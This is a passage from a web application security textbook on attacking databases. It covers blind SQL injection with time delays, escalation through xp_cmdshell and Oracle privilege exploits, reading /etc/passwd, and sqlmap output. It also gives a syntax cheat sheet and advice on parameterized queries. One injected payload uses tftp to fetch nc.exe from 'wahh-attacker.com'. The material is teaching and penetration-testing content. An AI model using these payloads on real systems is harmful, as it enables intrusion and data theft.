connect to a nonexistent server, causing a timeout. This causes the database 
to attempt to connect to the specifi ed server and eventually time out. For 
example:
SELECT ‚Äòa‚Äô||Utl_Http.request(‚Äòhttp://madeupserver.com‚Äô) from dual 
...delay...
ORA-29273: HTTP request failed
ORA-06512: at ‚ÄúSYS.UTL_HTTP‚Äù, line 1556
ORA-12545: Connect failed because target host or object does not exist
You can leverage this behavior to cause a time delay contingent on some 
condition that you specify. For example, the following query causes a timeout 
if the default Oracle account DBSNMP exists:
SELECT ‚Äòa‚Äô||Utl_Http.request(‚Äòhttp://madeupserver.com‚Äô) FROM dual WHERE
 (SELECT username FROM all_users WHERE username = ‚ÄòDBSNMP‚Äô) = ‚ÄòDBSNMP‚Äô
In both Oracle and MySQL databases, you can use the SUBSTR(ING)and ASCII
functions to retrieve arbitrary information one byte at a time, as described 
previously.
TIP We have described the use of time delays as a means of extracting 
interesting information. However, the time-delay technique can also be 
immensely useful when performing initial probing of an application to 
detect SQL injection vulnerabilities. In some cases of completely blind 
SQL injection, where no results are returned to the browser and all errors 
are handled invisibly, the vulnerability itself may be hard to detect using 
standard techniques based on supplying crafted input. In this situation, 
using time delays is often the most reliable way to detect the presence of a 
vulnerability during initial probing. For example, if the back-end database 
is MS-SQL, you can inject each of the following strings into each request 
parameter in turn and monitor how long the application takes to identify 
any vulnerabilities:
‚Äò; waitfor delay ‚Äò0:30:0‚Äô--
1; waitfor delay ‚Äò0:30:0‚Äô--
TRY IT!
This lab example contains a SQL injection vulnerability with no error feedback. You can use it to practice various advanced techniques, including the 
use of conditional responses and time delays.
http://mdsec.net/addressbook/44/
c09.indd 324 c09.indd 324 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 325
 Chapter 9 n Attacking Data Stores 325
Beyond SQL Injection: Escalating the Database Attack
A successful exploit of a SQL injection vulnerability often results in total compromise of all application data. Most applications employ a single account for 
all database access and rely on application-layer controls to enforce segregation 
of access between different users. Gaining unrestricted use of the application‚Äôs 
database account results in access to all its data.
You may suppose, therefore, that owning all the application‚Äôs data is the 
fi nishing point of a SQL injection attack. However, there are many reasons 
why it might be productive to advance your attack further, either by exploiting 
a vulnerability within the database itself or by harnessing some of its built-in 
functionality to achieve your objectives. Further attacks that can be performed 
by escalating the database attack include the following:
n If the database is shared with other applications, you may be able to escalate 
privileges within the database and gain access to other applications‚Äô data.
n You may be able to compromise the operating system of the database server.
n You may be able to gain network access to other systems. Typically, the 
database server is hosted on a protected network behind several layers 
of network perimeter defenses. From the database server, you may be in 
a trusted position and be able to reach key services on other hosts, which 
may be further exploitable.
n You may be able to make network connections back out of the hosting 
infrastructure to your own computer. This may enable you to bypass the 
application, easily transmitting large amounts of sensitive data gathered 
from the database, and often evading many intrusion detection systems.
n You may be able to extend the database‚Äôs existing functionality in arbitrary 
ways by creating user-defi ned functions. In some situations, this may enable 
you to circumvent hardening that has been performed on the database by 
effectively reimplementing functionality that has been removed or disabled. 
There is a method for doing this in each of the mainstream databases, 
provided that you have gained database administrator (DBA) privileges.
COMMON MYTH
Many database administrators assume that it is unnecessary to defend the database against attacks that require authentication to exploit. They may reason 
that the database is accessed by only a trusted application that is owned by the 
same organization. This ignores the possibility that a fl aw within the application may enable a malicious third party to interact with the database within the 
application‚Äôs security context. Each of the possible attacks just described should 
illustrate why databases need to be defended against authenticated attackers.
c09.indd 325 c09.indd 325 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 326
326 Chapter 9 n Attacking Data Stores
Attacking databases is a huge topic that is beyond the scope of this book. This 
section points you toward a few key ways in which vulnerabilities and functionality within the main database types can be leveraged to escalate your attack. 
The key conclusion to draw is that every database contains ways to escalate 
privileges. Applying current security patches and robust hardening can help 
mitigate many of these attacks, but not all of them. For further reading on this 
highly fruitful area of current research, we recommend The Database Hacker‚Äôs
Handbook (Wiley, 2005).
MS-SQL
Perhaps the most notorious piece of database functionality that an attacker can 
misuse is the xp_cmdshell stored procedure, which is built into MS-SQL by 
default. This stored procedure allows users with DBA permissions to execute 
operating system commands in the same way as the cmd.exe command prompt. 
For example:
master..xp_cmdshell ‚Äòipconfig > foo.txt‚Äô
The opportunity for an attacker to misuse this functionality is huge. He can 
perform arbitrary commands, pipe the results to local fi les, and read them back. 
He can open out-of-band network connections back to himself and create a 
backdoor command and communications channel, copying data from the server 
and uploading attack tools. Because MS-SQL runs by default as LocalSystem,
the attacker typically can fully compromise the underlying operating system, 
performing arbitrary actions. MS-SQL contains a wealth of other extended 
stored procedures, such as xp_regread and xp_regwrite, that can be used to 
perform powerful actions within the registry of the Windows operating system.
Dealing with Default Lockdown
Most installations of MS-SQL encountered on the Internet will be MS-SQL 2005 
or later. These versions contain numerous security features that lock down the 
database by default, preventing many useful attack techniques from working.
However, if the web application‚Äôs user account within the database is suffi ciently high-privileged, it is possible to overcome these obstacles simply by 
reconfi guring the database. For example, if xp_cmdshell is disabled, it can be 
re-enabled with the sp_configure stored procedure. The following four lines 
of SQL do this:
EXECUTE sp_configure ‚Äòshow advanced options‚Äô, 1
RECONFIGURE WITH OVERRIDE
EXECUTE sp_configure ‚Äòxp_cmdshell‚Äô, ‚Äò1‚Äô
RECONFIGURE WITH OVERRIDE
c09.indd 326 c09.indd 326 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 327
 Chapter 9 n Attacking Data Stores 327
At this point, xp_cmdshell is re-enabled and can be run with the usual 
command:
exec xp_cmdshell ‚Äòdir‚Äô
Oracle
A huge number of security vulnerabilities have been found within the Oracle 
database software itself. If you have found a SQL injection vulnerability that 
enables you to perform arbitrary queries, typically you can escalate to DBA 
privileges by exploiting one of these vulnerabilities.
Oracle contains many built-in stored procedures that execute with DBA privileges and have been found to contain SQL injection fl aws within the procedures 
themselves. A typical example of such a fl aw existed in the default package 
SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES prior to the July 2006 
critical patch update. This can be exploited to escalate privileges by injecting 
the query grant DBA to public into the vulnerable fi eld:
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‚ÄòINDX‚Äô,‚ÄôSCH‚Äô,
‚ÄòTEXTINDEXMETHODS‚Äù.ODCIIndexUtilCleanup(:p1); execute immediate
‚Äò‚Äôdeclare pragma autonomous_transaction; begin execute immediate
‚Äò‚Äô‚Äô‚Äôgrant dba to public‚Äô‚Äô‚Äô‚Äô ; end;‚Äô‚Äô; END;--‚Äô,‚ÄôCTXSYS‚Äô,1,‚Äô1‚Äô,0) from dual
This type of attack could be delivered via a SQL injection fl aw in a web application by injecting the function into the vulnerable parameter.
In addition to actual vulnerabilities like these, Oracle also contains a large 
amount of default functionality. It is accessible by low-privileged users and 
can be used to perform undesirable actions, such as initiating network connections or accessing the fi lesystem. In addition to the powerful packages already 
described for creating out-of-band connections, the package UTL_FILE can be 
used to read from and write to fi les on the database server fi lesystem.
In 2010, David Litchfi eld demonstrated how Java can be abused in Oracle 10g 
R2 and 11g to execute operating system commands. This attack fi rst exploits a 
fl aw in DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY to grant the current user the 
permission java.io.filepermission. The attack then executes a Java class 
(oracle/aurora/util/Wrapper) that runs an OS command, using DBMS_JAVA.
RUNJAVA. For example:
DBMS_JAVA.RUNJAVA(‚Äòoracle/aurora/util/Wrapper c:\\windows\\system32\\
cmd.exe /c dir>c:\\OUT.LST‚Äô)
More details can be found here:
n www.databasesecurity.com/HackingAurora.pdf
n www.notsosecure.com/folder2/2010/08/02/blackhat-2010/
c09.indd 327 c09.indd 327 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 328
328 Chapter 9 n Attacking Data Stores
MySQL
Compared to the other databases covered, MySQL contains relatively little 
built-in functionality that an attacker can misuse. One example is the ability 
of any user with the FILE_PRIV permission to read and write to the fi lesystem.
The LOAD_FILE command can be used to retrieve the contents of any fi le. For 
example:
select load_file(‚Äò/etc/passwd‚Äô)
The SELECT ... INTO OUTFILE command can be used to pipe the results of 
any query into a fi le. For example:
create table test (a varchar(200))
insert into test(a) values (‚Äò+ +‚Äô)
select * from test into outfile ‚Äò/etc/hosts.equiv‚Äô
In addition to reading and writing key operating system fi les, this capability 
can be used to perform other attacks:
n Because MySQL stores its data in plaintext fi les, to which the database 
must have read access, an attacker with FILE_PRIV permissions can simply 
open the relevant fi le and read arbitrary data from within the database, 
bypassing any access controls enforced within the database itself.
n MySQL enables users to create user-defi ned functions (UDFs) by calling 
out to a compiled library fi le that contains the function‚Äôs implementation. 
This fi le must be located within the normal path from which MySQL loads 
dynamic libraries. An attacker can use the preceding method to create 
an arbitrary binary fi le within this path and then create a UDF that uses 
it. Refer to Chris Anley‚Äôs paper ‚ÄúHackproofi ng MySQL‚Äù for more details 
on this technique.
Using SQL Exploitation Tools
Many of the techniques we have described for exploiting SQL injection vulnerabilities involve performing large numbers of requests to extract small amounts 
of data at a time. Fortunately, numerous tools are available that automate much 
of this process and that are aware of the database-specifi c syntax required to 
deliver successful attacks.
Most of the currently available tools use the following approach to exploit 
SQL injection vulnerabilities:
n Brute-force all parameters in the target request to locate SQL injection 
points.
c09.indd 328 c09.indd 328 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 329
 Chapter 9 n Attacking Data Stores 329
n Determine the location of the vulnerable fi eld within the back-end SQL 
query by appending various characters such as closing brackets, comment 
characters, and SQL keywords.
n Attempt to perform a UNION attack by brute-forcing the number of required 
columns and then identifying a column with the varchar data type, which 
can be used to return results.
n Inject custom queries to retrieve arbitrary data ‚Äî if necessary, concatenating data from multiple columns into a string that can be retrieved 
through a single result of the varchar data type.
n If results cannot be retrieved using UNION, inject Boolean conditions (AND 
1=1, AND 1=2, and so on) into the query to determine whether conditional 
responses can be used to retrieve data.
n If results cannot be retrieved by injecting conditional expressions, try 
using conditional time delays to retrieve data.
These tools locate data by querying the relevant metadata tables for the database in question. Generally they can perform some level of escalation, such as 
using xp_cmdshell to gain OS-level access. They also use various optimization 
techniques, making use of the many features and built-in functions in the various 
databases to decrease the number of necessary queries in an inference-based 
brute-force attack, evade potential fi lters on single quotes, and more.
NOTE These tools are primarily exploitation tools, best suited to extracting 
data from the database by exploiting an injection point that you have already 
identifi ed and understood. They are not a magic bullet for fi nding and exploiting SQL injection fl aws. In practice, it is often necessary to provide some 
additional SQL syntax before and/or after the data injected by the tool for the 
tool‚Äôs hard-coded attacks to work.
HACK STEPS
When you have identifi ed a SQL injection vulnerability, using the techniques 
described earlier in this chapter, you can consider using a SQL injection tool to 
exploit the vulnerability and retrieve interesting data from the database. This 
option is particularly useful in cases where you need to use blind techniques 
to retrieve a small amount of data at a time.
 1. Run the SQL exploitation tool using an intercepting proxy. Analyze the 
requests made by the tool as well as the application‚Äôs responses. Turn on 
any verbose output options on the tool, and correlate its progress with the 
observed queries and responses.
Continued
c09.indd 329 c09.indd 329 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 330
330 Chapter 9 n Attacking Data Stores
 2. Because these kinds of tools rely on preset tests and specific response 
syntax, it may be necessary to append or prepend data to the string 
injected by the tool to ensure that the tool gets the expected response. 
Typical requirements are adding a comment character, balancing the 
single quotes within the server‚Äôs SQL query, and appending or prepending 
closing brackets to the string to match the original query.
 3. If the syntax appears to be failing regardless of the methods described 
here, it is often easiest to create a nested subquery that is fully under 
your control, and allow the tool to inject into that. This allows the tool to 
use inference to extract data. Nested queries work well when you inject 
into standard SELECT and UPDATE queries. Under Oracle they work within 
an INSERT statement. In each of the following cases, prepend the text 
occurring before [input], and append the closing bracket occurring after 
that point:
n Oracle: ‚Äò||(select 1 from dual where 1=[input])
n MS-SQL: (select 1 where 1=[input])
Numerous tools exist for automated exploitation of SQL injection. Many of 
these are specifi cally geared toward MS-SQL, and many have ceased active 
development and have been overtaken by new techniques and developments in 
SQL injection. The authors‚Äô favorite is sqlmap, which can attack MySQL, Oracle, 
and MS-SQL, among others. It implements UNION-based and inference-based 
retrieval. It supports various escalation methods, including retrieval of fi les 
from the operating system, and command execution under Windows using 
xp_cmdshell.
In practice, sqlmap is an effective tool for database information retrieval 
through time-delay or other inference methods and can be useful for UNIONbased retrieval. One of the best ways to use it is with the --sql-shell option. 
This gives the attacker a SQL prompt and performs the necessary UNION, errorbased, or blind SQL injection behind the scenes to send and retrieve results. 
For example:
C:\sqlmap>sqlmap.py -u http://wahh-app.com/employees?Empno=7369 --union-use
 --sql-shell -p Empno
 sqlmap/0.8 - automatic SQL injection and database takeover tool
 http://sqlmap.sourceforge.net
[*] starting at: 14:54:39
[14:54:39] [INFO] using ‚ÄòC:\sqlmap\output\wahh-app.com\session‚Äô
 as session file
[14:54:39] [INFO] testing connection to the target url
[14:54:40] [WARNING] the testable parameter ‚ÄòEmpno‚Äô you provided is not 
HACK STEPS (CONTINUED)
c09.indd 330 c09.indd 330 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 331
 Chapter 9 n Attacking Data Stores 331
into the
 Cookie
[14:54:40] [INFO] testing if the url is stable, wait a few seconds
[14:54:44] [INFO] url is stable
[14:54:44] [INFO] testing sql injection on GET parameter ‚ÄòEmpno‚Äô with 0
 parenthesis
[14:54:44] [INFO] testing unescaped numeric injection on GET parameter 
‚ÄòEmpno‚Äô
[14:54:46] [INFO] confirming unescaped numeric injection on GET 
parameter ‚ÄòEmpno‚Äô
[14:54:47] [INFO] GET parameter ‚ÄòEmpno‚Äô is unescaped numeric injectable 
with 0
 parenthesis
[14:54:47] [INFO] testing for parenthesis on injectable parameter
[14:54:50] [INFO] the injectable parameter requires 0 parenthesis
[14:54:50] [INFO] testing MySQL
[14:54:51] [WARNING] the back-end DMBS is not MySQL
[14:54:51] [INFO] testing Oracle
[14:54:52] [INFO] confirming Oracle
[14:54:53] [INFO] the back-end DBMS is Oracle
web server operating system: Windows 2000
web application technology: ASP, Microsoft IIS 5.0
back-end DBMS: Oracle
[14:54:53] [INFO] testing inband sql injection on parameter ‚ÄòEmpno‚Äô with 
NULL
 bruteforcing technique
[14:54:58] [INFO] confirming full inband sql injection on parameter 
‚ÄòEmpno‚Äô
[14:55:00] [INFO] the target url is affected by an exploitable full 
inband
 sql injection vulnerability
valid union: ‚Äòhttp://wahh-app.com:80/employees.asp?Empno=7369%20
UNION%20ALL%20SEL
ECT%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%20FROM%20DUAL--%20AND%20
3663=3663‚Äô
[14:55:00] [INFO] calling Oracle shell. To quit type ‚Äòx‚Äô or ‚Äòq‚Äô and 
press ENTER
sql-shell> select banner from v$version
do you want to retrieve the SQL statement output? [Y/n]
[14:55:19] [INFO] fetching SQL SELECT statement query output: ‚Äòselect banner
 from v$version‚Äô
select banner from v$version [5]:
[*] CORE 9.2.0.1.0 Production
[*] NLSRTL Version 9.2.0.1.0 - Production
[*] Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production
[*] PL/SQL Release 9.2.0.1.0 - Production
[*] TNS for 32-bit Windows: Version 9.2.0.1.0 - Production
sql-shell>
c09.indd 331 c09.indd 331 8/19/2011 12:09:32 PM 8/19/2011 12:09:32 PM
Stuttard c09.indd V3 - 07/28/2011 Page 332
332 Chapter 9 n Attacking Data Stores
SQL Syntax and Error Reference
We have described numerous techniques that enable you to probe for and 
exploit SQL injection vulnerabilities in web applications. In many cases, there 
are minor differences between the syntax that you need to employ against 
different back-end database platforms. Furthermore, every database produces 
different error messages whose meaning you need to understand both when 
probing for fl aws and when attempting to craft an effective exploit. The following pages contain a brief cheat sheet that you can use to look up the exact 
syntax you need for a particular task and to decipher any unfamiliar error 
messages you encounter.
SQL Syntax
Requirement: ASCII and SUBSTRING
Oracle: ASCII(‚ÄòA‚Äô) is equal to 65
SUBSTR(‚ÄòABCDE‚Äô,2,3) is equal to BCD
MS-SQL: ASCII(‚ÄòA‚Äô) is equal to 65
SUBSTRING(‚ÄòABCDE‚Äô,2,3) is equal to BCD
MySQL: ASCII(‚ÄòA‚Äô) is equal to 65
SUBSTRING(‚ÄòABCDE‚Äô,2,3) is equal to BCD
Requirement: Retrieve current database user
Oracle: Select Sys.login_user from dual SELECT 
user FROM dual SYS_CONTEXT(‚ÄòUSERENV‚Äô, 
‚ÄòSESSION_USER‚Äô)
MS-SQL: select suser_sname()
MySQL: SELECT user()
Requirement: Cause a time delay
Oracle: Utl_Http.request(‚Äòhttp://madeupserver.com‚Äô)
MS-SQL: waitfor delay ‚Äò0:0:10‚Äô
exec master..xp_cmdshell ‚Äòping localhost‚Äô
MySQL: sleep(100)
c09.indd 332 c09.indd 332 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 333
 Chapter 9 n Attacking Data Stores 333
Requirement: Retrieve database version string
Oracle: select banner from v$version
MS-SQL: select @@version
MySQL: select @@version
Requirement: Retrieve current database
Oracle: SELECT SYS_CONTEXT(‚ÄòUSERENV‚Äô,‚ÄôDB_NAME‚Äô) FROM dual
MS-SQL: SELECT db_name()
 The server name can be retrieved using:
SELECT @@servername
MySQL: SELECT database()
Requirement: Retrieve current user‚Äôs privilege
Oracle: SELECT privilege FROM session_privs
MS-SQL: SELECT grantee, table_name, privilege_type FROM 
INFORMATION_SCHEMA.TABLE_PRIVILEGES
MySQL: SELECT * FROM information_schema.user_privileges 
WHERE grantee = ‚Äò[user]‚Äô where [user] is determined 
from the output of SELECT user()
Requirement: Show all tables and columns in a single column of results
Oracle: Select table_name||‚Äô
‚Äò||column_name from all_tab_columns
MS-SQL: SELECT table_name+‚Äô
‚Äò+column_name from information_schema.columns
MySQL: SELECT CONCAT(table_name,
‚Äò,column_name) from information_schema.columns
Requirement: Show user objects
Oracle: SELECT object_name, object_type FROM user_objects
MS-SQL: SELECT name FROM sysobjects
MySQL: SELECT table_name FROM information_schema.tables
(or trigger_name from information_schema.triggers, etc.)
Continued
c09.indd 333 c09.indd 333 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 334
334 Chapter 9 n Attacking Data Stores
Requirement: Show user tables
Oracle: SELECT object_name, object_type FROM user_objects 
WHERE object_type=‚ÄôTABLE‚Äô
Or to show all tables to which the user has access:
SELECT table_name FROM all_tables
MS-SQL: SELECT name FROM sysobjects WHERE xtype=‚ÄôU‚Äô
MySQL: SELECT table_name FROM information_schema.
tables where table_type=‚ÄôBASE TABLE‚Äô and 
table_schema!=‚Äômysql‚Äô
Requirement: Show column names for table foo
Oracle: SELECT column_name, name FROM user_tab_columns 
WHERE table_name = ‚ÄòFOO‚Äô
Use the ALL_tab_columns table if the target data is not owned 
by the current application user.
MS-SQL: SELECT column_name FROM information_schema.columns 
WHERE table_name=‚Äôfoo‚Äô
MySQL: SELECT column_name FROM information_schema.columns 
WHERE table_name=‚Äôfoo‚Äô
Requirement: Interact with the operating system (simplest ways)
Oracle: See The Oracle Hacker‚Äôs Handbook by David Litchfi eld
MS-SQL: EXEC xp_cmshell ‚Äòdir c:\ ‚Äò
MySQL: SELECT load_file(‚Äò/etc/passwd‚Äô)
SQL Error Messages
Oracle: ORA-01756: quoted string not properly terminated
ORA-00933: SQL command not properly ended
MS-SQL: Msg 170, Level 15, State 1, Line 1
Line 1: Incorrect syntax near ‚Äòfoo‚Äô
Msg 105, Level 15, State 1, Line 1
Unclosed quotation mark before the character string 
‚Äòfoo‚Äô
(continued)
c09.indd 334 c09.indd 334 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 335
 Chapter 9 n Attacking Data Stores 335
MySQL: You have an error in your SQL syntax. Check the manual that corresponds to your MySQL server version 
for the right syntax to use near ‚Äò‚Äôfoo‚Äô at line X
Translation: For Oracle and MS-SQL, SQL injection is present, and it is almost 
certainly exploitable! If you entered a single quote and it altered 
the syntax of the database query, this is the error you‚Äôd expect. For 
MySQL, SQL injection may be present, but the same error message 
can appear in other contexts.
Oracle: PLS-00306: wrong number or types of arguments in 
call to ‚ÄòXXX‚Äô
MS-SQL: Procedure ‚ÄòXXX‚Äô expects parameter ‚Äò@YYY‚Äô, which was 
not supplied
MySQL: N/A
Translation: You have commented out or removed a variable that normally would 
be supplied to the database. In MS-SQL, you should be able to use 
time delay techniques to perform arbitrary data retrieval.
Oracle: ORA-01789: query block has incorrect number of 
result columns
MS-SQL: Msg 205, Level 16, State 1, Line 1
All queries in a SQL statement containing a UNION 
operator must have an equal number of expressions in 
their target lists.
MySQL: The used SELECT statements have a different number 
of columns
Translation: You will see this when you are attempting a UNION SELECT attack, 
and you have specifi ed a different number of columns to the number 
in the original SELECT statement.
Oracle: ORA-01790: expression must have same datatype as 
corresponding expression
MS-SQL: Msg 245, Level 16, State 1, Line 1
Syntax error converting the varchar value ‚Äòfoo‚Äô to a 
column of data type int.
MySQL: (MySQL will not give you an error.)
Translation: You will see this when you are attempting a UNION SELECT attack, 
and you have specifi ed a different data type from that found in the 
original SELECT statement. Try using a NULL, or using 1 or 2000.
Continued
c09.indd 335 c09.indd 335 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 336
336 Chapter 9 n Attacking Data Stores
Oracle: ORA-01722: invalid number
ORA-01858: a non-numeric character was found where a 
numeric was expected
MS-SQL: Msg 245, Level 16, State 1, Line 1
Syntax error converting the varchar value ‚Äòfoo‚Äô to a 
column of data type int.
MySQL: (MySQL will not give you an error.)
Translation: Your input doesn‚Äôt match the expected data type for the fi eld. You 
may have SQL injection, and you may not need a single quote, so 
try simply entering a number followed by your SQL to be injected. In 
MS-SQL, you should be able to return any string value with this error 
message.
Oracle: ORA-00923: FROM keyword not found where expected
MS-SQL: N/A
MySQL: N/A
Translation: The following will work in MS-SQL:
SELECT 1 
But in Oracle, if you want to return something, you must select from 
a table. The DUAL table will do fi ne:
SELECT 1 from DUAL
Oracle: ORA-00936: missing expression
MS-SQL: Msg 156, Level 15, State 1, Line 1Incorrect syntax 
near the keyword ‚Äòfrom‚Äô.
MySQL: You have an error in your SQL syntax. Check the 
manual that corresponds to your MySQL server version 
for the right syntax to use near ‚Äò XXX , YYY from 
SOME_TABLE‚Äô at line 1
Translation: You commonly see this error message when your injection point 
occurs before the FROM keyword (for example, you have injected 
into the columns to be returned) and/or you have used the comment character to remove required SQL keywords. Try completing the 
SQL statement yourself while using your comment character. MySQL 
should helpfully reveal the column names XXX, YYY when this condition is encountered.
(continued)
c09.indd 336 c09.indd 336 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 337
 Chapter 9 n Attacking Data Stores 337
Oracle: ORA-00972:identifier is too long
MS-SQL: String or binary data would be truncated.
MySQL: N/A
Translation: This does not indicate SQL injection. You may see this error message 
if you have entered a long string. You‚Äôre unlikely to get a buffer overfl ow here either, because the database is handling your input safely.
Oracle: ORA-00942: table or view does not exist
MS-SQL: Msg 208, Level 16, State 1, Line 1
Invalid object name ‚Äòfoo‚Äô
MySQL: Table ‚ÄòDBNAME.SOMETABLE‚Äô doesn‚Äôt exist
Translation: Either you are trying to access a table or view that does not exist, or, 
in the case of Oracle, the database user does not have privileges for 
the table or view. Test your query against a table you know you have 
access to, such as DUAL. MySQL should helpfully reveal the current 
database schema DBNAME when this condition is encountered.
Oracle: ORA-00920: invalid relational operator
MS-SQL: Msg 170, Level 15, State 1, Line 1
Line 1: Incorrect syntax near foo
MySQL: You have an error in your SQL syntax. Check the 
manual that corresponds to your MySQL server version 
for the right syntax to use near ‚Äò‚Äô at line 1
Translation: You were probably altering something in a WHERE clause, and your 
SQL injection attempt has disrupted the grammar.
Oracle: ORA-00907: missing right parenthesis
MS-SQL: N/A
MySQL: You have an error in your SQL syntax. Check the 
manual that corresponds to your MySQL server version 
for the right syntax to use near ‚Äò‚Äô at line 1
Translation: Your SQL injection attempt has worked, but the injection point was 
inside parentheses. You probably commented out the closing parenthesis with injected comment characters (--).
Continued
c09.indd 337 c09.indd 337 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 338
338 Chapter 9 n Attacking Data Stores
Oracle: ORA-00900: invalid SQL statement
MS-SQL: Msg 170, Level 15, State 1, Line 1
Line 1: Incorrect syntax near foo
MySQL: You have an error in your SQL syntax. Check the 
manual that corresponds to your MySQL server version 
for the right syntax to use near XXXXXX
Translation: A general error message. The error messages listed previously all take 
precedence, so something else went wrong. It‚Äôs likely you can try 
alternative input and get a more meaningful message.
Oracle: ORA-03001: unimplemented feature
MS-SQL: N/A
MySQL: N/A
Translation: You have tried to perform an action that Oracle does not allow. This 
can happen if you were trying to display the database version string 
from v$version but you were in an UPDATE or INSERT query.
Oracle: ORA-02030: can only select from fixed tables/views
MS-SQL: N/A
MySQL: N/A
Translation: You were probably trying to edit a SYSTEM view. This can happen if you were trying to display the database version string from 
v$version but you were in an UPDATE or INSERT query.
Preventing SQL Injection
Despite all its different manifestations, and the complexities that can arise in its 
exploitation, SQL injection is in general one of the easier vulnerabilities to prevent. 
Nevertheless, discussion about SQL injection countermeasures is frequently misleading, and many people rely on defensive measures that are only partially effective.
Partially Effective Measures 
Because of the prominence of the single quotation mark in the standard explanations of SQL injection fl aws, a common approach to preventing attacks is to 
escape any single quotation marks within user input by doubling them. You 
have already seen two situations in which this approach fails:
n If numeric user-supplied data is being embedded into SQL queries, this 
is not usually encapsulated within single quotation marks. Hence, an 
(continued)
c09.indd 338 c09.indd 338 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 339
 Chapter 9 n Attacking Data Stores 339
attacker can break out of the data context and begin entering arbitrary 
SQL without the need to supply a single quotation mark.
n In second-order SQL injection attacks, data that has been safely escaped 
when initially inserted into the database is subsequently read from the 
database and then passed back to it again. Quotation marks that were 
doubled initially return to their original form when the data is reused.
Another countermeasure that is often cited is the use of stored procedures 
for all database access. There is no doubt that custom stored procedures can 
provide security and performance benefi ts. However, they are not guaranteed 
to prevent SQL injection vulnerabilities for two reasons:
n As you saw in the case of Oracle, a poorly written stored procedure can 
contain SQL injection vulnerabilities within its own code. Similar security 
issues arise when constructing SQL statements within stored procedures 
as arise elsewhere. The fact that a stored procedure is being used does 
not prevent fl aws from occurring.
n Even if a robust stored procedure is being used, SQL injection vulnerabilities can arise if it is invoked in an unsafe way using user-supplied input. 
For example, suppose that a user registration function is implemented 
within a stored procedure, which is invoked as follows:
exec sp_RegisterUser ‚Äòjoe‚Äô, ‚Äòsecret‚Äô
This statement may be just as vulnerable as a simple INSERT statement. 
For example, an attacker may supply the following password:
foo‚Äô; exec master..xp_cmdshell ‚Äòtftp wahh-attacker.com GET nc.exe‚Äô--
which causes the application to perform the following batch query:
exec sp_RegisterUser ‚Äòjoe‚Äô, ‚Äòfoo‚Äô; exec master..xp_cmdshell ‚Äòtftp 
wahh-attacker.com GET nc.exe‚Äô--‚Äô
Therefore, the use of the stored procedure has achieved nothing.
In fact, in a large and complex application that performs thousands of different 
SQL statements, many developers regard the solution of reimplementing these statements as stored procedures to be an unjustifi able overhead on development time.
Parameterized Queries
Most databases and application development platforms provide APIs for handling 
untrusted input in a secure way, which prevents SQL injection vulnerabilities 
from arising. In parameterized queries (also known as prepared statements), the 
construction of a SQL statement containing user input is performed in two steps:
 1. The application specifi es the query‚Äôs structure, leaving placeholders for 
each item of user input.
 2. The application specifi es the contents of each placeholder.
c09.indd 339 c09.indd 339 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 340
340 Chapter 9 n Attacking Data Stores
Crucially, there is no way in which crafted data that is specifi ed at the 
second step can interfere with the structure of the query specifi ed in the fi rst 
step. Because the query structure has already been defi ned, the relevant API 
handles any type of placeholder data in a safe manner, so it is always interpreted 
as data rather than part of the statement‚Äôs structure.
The following two code samples illustrate the difference between an unsafe 
query dynamically constructed from user data and its safe parameterized counterpart. In the fi rst, the user-supplied name parameter is embedded directly into 
a SQL statement, leaving the application vulnerable to SQL injection:
//define the query structure
String queryText = ‚Äúselect ename,sal from emp where ename =‚Äô‚Äù;
//concatenate the user-supplied name
queryText += request.getParameter(‚Äúname‚Äù);
queryText += ‚Äú‚Äô‚Äù;
// execute the query
stmt = con.createStatement();
rs = stmt.executeQuery(queryText);
In the second example, the query structure is defi ned using a question mark as 
a placeholder for the user-supplied parameter. The prepareStatement method is 
invoked to interpret this and fi x the structure of the query that is to be executed. 
Only then is the setString method used to specify the parameter‚Äôs actual value. 
Because the query‚Äôs structure has already been fi xed, this value can contain any 
data without affecting the structure. The query is then executed safely:
//define the query structure
String queryText = ‚ÄúSELECT ename,sal FROM EMP WHERE ename = ?‚Äù;
//prepare the statement through DB connection ‚Äúcon‚Äù
stmt = con.prepareStatement(queryText);
//add the user input to variable 1 (at the first ? placeholder)
stmt.setString(1, request.getParameter(‚Äúname‚Äù));
// execute the query
rs = stmt.executeQuery();
NOTE The precise methods and syntax for creating parameterized queries differ among databases and application development platforms. See Chapter 18 
for more details about the most common examples.
c09.indd 340 c09.indd 340 8/19/2011 12:09:33 PM 8/19/2011 12:09:33 PM
Stuttard c09.indd V3 - 07/28/2011 Page 341
 Chapter 9 n Attacking Data Stores 341
If parameterized queries are to be an effective solution against SQL injection, 
you need to keep in mind several important provisos:
n They should be used for every database query. The authors have encountered many applications where the developers made a judgment in each 
